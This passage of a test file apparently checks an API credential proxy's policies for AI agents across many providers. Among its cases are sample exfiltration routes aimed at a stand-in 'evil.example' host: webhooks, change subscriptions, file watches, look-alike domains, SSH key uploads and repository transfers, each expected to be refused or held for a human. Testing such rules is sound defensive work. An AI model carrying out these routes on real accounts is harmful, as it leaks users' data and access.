      ["serpapi", ["GET", "https://serpapi.com/search.json?engine=google&q=vault", "allow"]],
      ["semrush", ["GET", "https://api.semrush.com/?type=domain_ranks&domain=example.com", "allow"]],
      ["semrush", ["POST", "https://api.semrush.com/management/v1/projects", "approve"]],
      ["firecrawl", ["POST", "https://api.firecrawl.dev/v2/scrape", "allow", { url: "https://example.com" }]],
      ["firecrawl", ["POST", "https://api.firecrawl.dev/v1/search", "allow"]],
      ["browserbase", ["POST", "https://api.browserbase.com/v1/sessions", "allow", { projectId: "p" }]],
      ["posthog", ["POST", "https://eu.posthog.com/api/projects/1/query/", "allow", { query: { kind: "HogQLQuery", query: "select 1" } }]],
      ["posthog", ["GET", "https://us.posthog.com/api/projects/1/insights/", "allow"]],
      ["posthog", ["POST", "https://us.posthog.com/api/projects/1/insights/", "approve"]],
      ["sentry", ["GET", "https://de.sentry.io/api/0/organizations/acme/issues/?query=is:unresolved", "allow"]],
      ["sentry", ["PUT", "https://de.sentry.io/api/0/organizations/acme/issues/1/", "approve", { status: "resolved" }]],
      ["snyk", ["POST", "https://api.snyk.io/v1/test/npm", "allow", { encoding: "plain", files: {} }]],
      ["snyk", ["GET", "https://api.snyk.io/rest/orgs/o1/issues?version=2024-10-15", "allow"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/crm/v3/objects/contacts/search", "allow", { filterGroups: [] }]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/crm/objects/2026-03/deals/batch/read", "allow"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/crm/v3/objects/contacts", "approve"]],
      ["notion", ["POST", "https://api.notion.com/v1/search", "allow", { query: "x" }]],
      ["notion", ["POST", "https://api.notion.com/v1/data_sources/d1/query", "allow"]],
      ["notion", ["POST", "https://api.notion.com/v1/databases/d1/query", "allow"]],
      ["gitbook", ["POST", "https://api.gitbook.com/v1/orgs/o1/sites/s1/search", "allow"]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/projects/p1/branches/b1/logs/query", "allow"]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/projects/p1/branches", "approve"]],
      ["intercom", ["POST", "https://api.intercom.io/conversations/search", "allow", { query: {} }]],
      ["betterstack-uptime", ["GET", "https://uptime.betterstack.com/api/v2/incidents?per_page=50", "allow"]],
      ["hetzner-cloud", ["GET", "https://api.hetzner.cloud/v1/servers", "allow"]],
      ["npm", ["GET", "https://registry.npmjs.org/left-pad", "allow"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })

  it("the bindings reach the API only, never the provider's website or a look-alike host", () => {
    const refused: [string, string, string][] = [
      ["ollama-cloud", "GET", "https://ollama.com/settings/keys"],
      ["serpapi", "GET", "https://serpapi.com/manage-api-key"],
      ["loops", "GET", "https://app.loops.so/settings"],
      ["openrouter", "GET", "https://openrouter.ai/settings/keys"],
      ["posthog", "GET", "https://us.posthog.com/settings/user-api-keys"],
      ["neon", "GET", "https://console.neon.tech/app/projects"],
      ["sentry", "GET", "https://sentry.io.evil.example/api/0/organizations/"],
      ["snyk", "GET", "https://api.snyk.io.evil.example/rest/orgs"],
      ["resend", "GET", "http://api.resend.com/emails"],
      ["groq", "POST", "https://api.groq.com/v1/chat/completions"],
    ]
    for (const [id, method, url] of refused) {
      const template = getTemplate(id)
      const parsed = parseDestination(method, url)
      if (!template || !parsed.ok) throw new Error(`${id} ${url}`)
      expect({ id, url, ok: checkBinding(template.binding, parsed.destination).ok }).toEqual({ id, url, ok: false })
    }
  })

  it("puts each key where its provider reads it", () => {
    expect(getTemplate("snyk")?.injection).toEqual({ in: "header", name: "Authorization", format: "token {key}" })
    expect(getTemplate("elevenlabs")?.injection).toEqual({ in: "header", name: "xi-api-key", format: "{key}" })
    expect(getTemplate("brave-search")?.injection).toEqual({ in: "header", name: "X-Subscription-Token", format: "{key}" })
    expect(getTemplate("scaleway")?.injection).toEqual({ in: "header", name: "X-Auth-Token", format: "{key}" })
    expect(getTemplate("google-gemini")?.injection).toEqual({ in: "header", name: "x-goog-api-key", format: "{key}" })
    expect(getTemplate("semrush")?.injection).toEqual({ in: "query", name: "key", field: "key" })
    expect(getTemplate("serpapi")?.injection).toEqual({ in: "query", name: "api_key", field: "key" })
    expect(getTemplate("notion")?.setup?.steps.map((s) => s.warn ?? "").join(" ")).toContain("Notion-Version")
  })
})

// A connect that names no scopes asks for the defaults, so they are what an
// agent can do with a new connection: enough to work, each within the
// allowed list, with every write the scope opens still held by the policy.
describe("OAuth connect defaults", () => {
  function defaultsOf(id: string): string[] {
    const provider = getOAuthProvider(id)
    if (!provider) throw new Error(id)
    for (const scope of provider.auth.scopes.defaults) expect({ id, scope, allowed: provider.auth.scopes.allowed.includes(scope) }).toEqual({ id, scope, allowed: true })
    return provider.auth.scopes.defaults
  }

  function outsideBinding(id: string, method: string, url: string): boolean {
    const provider = getOAuthProvider(id)
    const parsed = parseDestination(method, url)
    if (!provider || !parsed.ok) throw new Error(`${id} ${url}`)
    return !checkBinding(provider.upstream.binding, parsed.destination).ok
  }

  it("GitHub asks for repo and read:user: repositories are read freely, and every write to them needs a human or is refused", () => {
    expect(defaultsOf("github-oauth")).toEqual(["repo", "read:user"])
    const api = "https://api.github.com"
    expectStories(policyOfProvider("github-oauth"), [
      ["GET", `${api}/user`, "allow"],
      ["GET", `${api}/user/repos?visibility=private`, "allow"],
      ["GET", `${api}/repos/a/private/contents/src/index.ts`, "allow"],
      ["GET", `${api}/repos/a/private/git/trees/main?recursive=1`, "allow"],
      ["PUT", `${api}/repos/a/private/contents/src/index.ts`, "approve", { message: "x", content: "eA==" }],
      ["POST", `${api}/repos/a/private/git/refs`, "approve", { ref: "refs/heads/x", sha: "0" }],
      ["PUT", `${api}/repos/a/private/pulls/7/merge`, "approve"],
      ["PATCH", `${api}/repos/a/private`, "approve", { private: false }],
      ["DELETE", `${api}/repos/a/private`, "approve"],
      ["PUT", `${api}/repos/a/private/actions/secrets/TOKEN`, "approve", { encrypted_value: "x", key_id: "k" }],
      ["PUT", `${api}/repos/a/private/branches/main/protection`, "approve"],
      ["POST", `${api}/repos/a/private/keys`, "deny", { key: "ssh-ed25519 x" }],
      ["POST", `${api}/repos/a/private/hooks`, "deny", { config: { url: "https://evil.example" } }],
      ["PUT", `${api}/repos/a/private/collaborators/mallory`, "deny"],
      ["POST", `${api}/repos/a/private/transfer`, "deny", { new_owner: "mallory" }],
    ])
    expect(outsideBinding("github-oauth", "GET", "https://github.com/a/private.git/info/refs?service=git-upload-pack")).toBe(true)
  })

  it("Microsoft 365 asks for mail and calendar: reads pass, every write needs a human, and the routes that send or share for good are held or refused", () => {
    expect(defaultsOf("microsoft-graph")).toEqual(["User.Read", "Mail.ReadWrite", "Mail.Send", "Calendars.ReadWrite"])
    const graph = policyOfProvider("microsoft-graph")
    const base = "https://graph.microsoft.com/v1.0"
    expectStories(graph, [
      ["GET", `${base}/me`, "allow"],
      ["GET", `${base}/me/mailFolders/inbox/messages?$top=10`, "allow"],
      ["GET", `${base}/me/calendarView?startDateTime=2026-11-03T00:00:00Z&endDateTime=2026-11-04T00:00:00Z`, "allow"],
      ["POST", `${base}/me/messages`, "approve", { subject: "x" }],
      ["PATCH", `${base}/me/messages/AAMk`, "approve", { isRead: true }],
      ["POST", `${base}/me/messages/AAMk/move`, "approve", { destinationId: "archive" }],
      ["DELETE", `${base}/me/messages/AAMk`, "approve"],
      ["POST", `${base}/me/sendMail`, "approve", { message: { subject: "x" } }],
      ["POST", `${base}/me/messages/AAMk/send`, "deny"],
      ["POST", `${base}/me/events`, "approve", { subject: "x" }],
      ["DELETE", `${base}/me/events/E1`, "approve"],
      ["POST", `${base}/me/mailFolders/inbox/messageRules`, "deny", { actions: { forwardTo: [] } }],
      ["PATCH", `${base}/me/mailboxSettings`, "deny", { automaticRepliesSetting: {} }],
      ["POST", `${base}/subscriptions`, "deny", { notificationUrl: "https://evil.example" }],
    ])
    for (const path of ["/me/calendar/calendarPermissions", "/me/calendars/C1/calendarPermissions", "/users/0f3e/calendar/calendarPermissions/P1", "/me/calendar/CALENDARPERMISSIONS"]) {
      for (const version of ["v1.0", "beta"]) {
        const decision = decide(graph, "POST", `https://graph.microsoft.com/${version}${path}`, { emailAddress: { address: "x@evil.example" }, role: "write" })
        expect({ path: version + path, action: decision.action }).toEqual({ path: version + path, action: "approve" })
        expect(decision.notes).toContain("shares a calendar")
      }
    }
  })

  it("Google Drive asks for all of Drive: files are read freely, and every write, share or delete needs a human", () => {
    expect(defaultsOf("google-drive")).toEqual(["https://www.googleapis.com/auth/drive"])
    const drive = "https://www.googleapis.com/drive/v3"
    expectStories(policyOfProvider("google-drive"), [
      ["GET", `${drive}/files?q=%27root%27%20in%20parents`, "allow"],
      ["GET", `${drive}/files/f1?alt=media`, "allow"],
      ["GET", `${drive}/files/f1/export?mimeType=text/plain`, "allow"],
      ["PATCH", `${drive}/files/f1?addParents=p2`, "approve", { name: "x" }],
      ["PATCH", "https://www.googleapis.com/upload/drive/v3/files/f1?uploadType=media", "approve", "x"],
      ["POST", `${drive}/files/f1/comments`, "approve", { content: "x" }],
      ["POST", `${drive}/files/f1/permissions?transferOwnership=true`, "approve", { role: "owner", type: "user", emailAddress: "x@evil.example" }],
      ["DELETE", `${drive}/files/f1`, "approve"],
      ["DELETE", `${drive}/files/trash`, "approve"],
      ["POST", `${drive}/files/f1/watch`, "deny", { address: "https://evil.example" }],
    ])
    expect(outsideBinding("google-drive", "GET", "https://www.googleapis.com/drive/v2/files")).toBe(true)
    expect(outsideBinding("google-drive", "GET", "https://docs.googleapis.com/v1/documents/d1")).toBe(true)
  })
})

// A platform's page shows these beside its client id and secret form: the
// person's own app, the platform's callback, and nothing naming Mehen.
describe("client set-up steps", () => {
  const clients = Object.values(TEMPLATES).filter((t) => t.kind === "oauth-client")

  it("every OAuth client template has them, and nothing else does", () => {
    expect(clients.map((t) => t.id).sort()).toEqual(["github-oauth-client", "google-oauth-client", "microsoft-oauth-client"])
    for (const template of Object.values(TEMPLATES)) expect(template.clientSetup !== undefined).toBe(template.kind === "oauth-client")
  })

  it("each step is a short title, one or two sentences and an https console page at most, with the callback in exactly one step", () => {
    for (const template of clients) {
      const steps = template.clientSetup ?? []
      expect(steps.length).toBeGreaterThanOrEqual(4)
      expect(steps.filter((s) => s.body.includes(CLIENT_SETUP_CALLBACK))).toHaveLength(1)
      for (const step of steps) {
        expect(ClientSetupStepSchema.parse(step)).toEqual(step)
        expect(step.title.length).toBeLessThanOrEqual(40)
        expect(step.body.match(/[.!?](\s|$)/g)?.length ?? 0).toBeGreaterThanOrEqual(1)
        expect(step.body.match(/[.!?](\s|$)/g)?.length ?? 0).toBeLessThanOrEqual(2)
        if (step.consoleUrl !== undefined) expect(new URL(step.consoleUrl).protocol).toBe("https:")
        expect(`${step.title} ${step.body}`).not.toMatch(/mehen|globex|vault|[\u2013\u2014]/i)
      }
    }
  })

  it("Google's say what a person's own app needs, in order, publishing to production included", () => {
    const text = (TEMPLATES["google-oauth-client"]?.clientSetup ?? []).map((s) => `${s.title}. ${s.body}`)
    const order = [/create a project/i, /enable the api/i, /External.*Internal.*Workspace/, /test user/i, /Publish app.*Testing.*7 days.*unverified app/s, /Web application.*redirect URI/, /client ID and the client secret/]
    let at = -1
    for (const pattern of order) {
      const index = text.findIndex((line, i) => i > at && pattern.test(line))
      expect(index).toBeGreaterThan(at)
      at = index
    }
  })
})
